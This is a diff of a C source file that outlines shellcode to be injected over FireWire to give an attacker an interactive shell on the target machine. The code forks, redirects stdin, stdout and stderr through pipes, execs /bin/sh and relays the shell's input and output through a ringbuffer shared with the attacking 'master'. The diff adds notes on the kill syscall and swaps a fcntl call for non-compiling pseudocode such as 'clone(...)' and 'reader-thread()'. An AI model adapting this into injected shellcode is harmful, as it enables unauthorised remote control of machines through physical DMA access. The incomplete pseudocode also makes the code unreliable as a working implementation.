@@ -2,10 +2,6 @@
 // simple outline of a to-be-injected shellcode that gives
 // an interactive shell over firewire
 //
-// obviously this needs to be recoded as PIC in ASM, the smaller, the better.
-// 	ESI -> ringbuffer_from_master
-// 	EDI -> ringbuffer_to_master
-// 	EBP -> c2sh[0], sh2c[1]
 
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -13,8 +9,6 @@
 #include <unistd.h>
 #include <stdlib.h>
 #include <stdio.h>
-
-#define RB_SIZE 512
 
 /*
  * http://www.lxhp.in-berlin.de/lhpsyscal.html
@@ -45,6 +39,11 @@
  * fork:	eax: 2
  * 		ebx... are passed to forked process.
  *
+ * kill:	eax: 37
+ * 		ebx: pid (?)
+ * 		ecx: signal (?)
+ * 		SIGKILL = 9
+ *
  * nanosleep:	eax: 162
  * 		ebx: ptr to struct timespec
  * 		ecx: ptr to alterable struct timespec
@@ -66,16 +65,16 @@
 
 
 struct ringbuffer {
-	volatile int	writer_pos;		// init to 0
-	volatile int	reader_pos;		// init to 0
-	char		buffer[RB_SIZE];
+	volatile uint8_t	writer_pos;		// init to 0
+	volatile uint8_t	reader_pos;		// init to 0
+	char			buffer[256];
 };
 
 int main()
 {
 	// pipes:
-	int c2sh[2];	// parent->shell	 0: parent writes;			1: shell reads (stdin);
-	int sh2c[2];	// shell->parent	 0: shell writes (stdout,stderr);	1: parent reads;
+	int m2sh[2];	// middleman->shell	0: shell reads
+	int sh2m[2];	// shell->middleman	0: middleman reads
 
 	int		child_is_dead = 0;
 	volatile int	child_is_dead_ACK = 0;
@@ -91,19 +90,19 @@ int main()
 	// non-volatile copy of ringbuffer position
 	int rb_position;
 
-	if(0 > pipe(c2sh))
+	if(0 > pipe(m2sh))
 		goto child_dead;
-	if(0 > pipe(sh2c))
+	if(0 > pipe(sh2m))
 		goto child_dead;
 
 	switch(fork()) {
 		case 0:
 			// child: change stdin, stdout and stderr and exec /bin/sh
-			if(0 != dup2(c2sh[1], 0))
+			if(0 != dup2(m2sh[0], 0))
 				exit(0);
-			if(1 != dup2(sh2c[0], 1))
+			if(1 != dup2(sh2m[1], 1))
 				exit(0);
-			if(2 != dup2(sh2c[0], 2))
+			if(2 != dup2(sh2m[1], 2))
 				exit(0);
 
 			execl("/bin/sh", "/bin/sh", NULL);
@@ -111,15 +110,17 @@ int main()
 
 		default:
 			// parent: use a ringbuffer for stdin and stdout of child
-			close(c2sh[1]);
-			close(sh2c[0]);
+			close(m2sh[0]);
+			close(sh2m[1]);
 
-			// parent has to read from sh2c[1] and write to c2sh[0]
-			//            -> O_ASYNC
-			//            		only kernel2.6 for pipes...
-			//            		optional, in combination with nanosleep?
-			//            -> O_NONBLOCK
-			fcntl(sh2c[1], F_GETFL, O_NONBLOCK);
+			clone(...);
+			if(original) {
+				reader-thread();
+			} else {
+				// clone
+				writer-thread();
+			}
+
 			
 			// TODO:
 			// loop with read/write relayed via ringbuffer and nanosleep
@@ -140,6 +141,7 @@ int main()
 					// unless buffer is full
 					if( !(to_master.writer_pos == rb_position) ) {
 						// do read...
+						// read() may return -EAGAIN
 					}
 				}
 			}
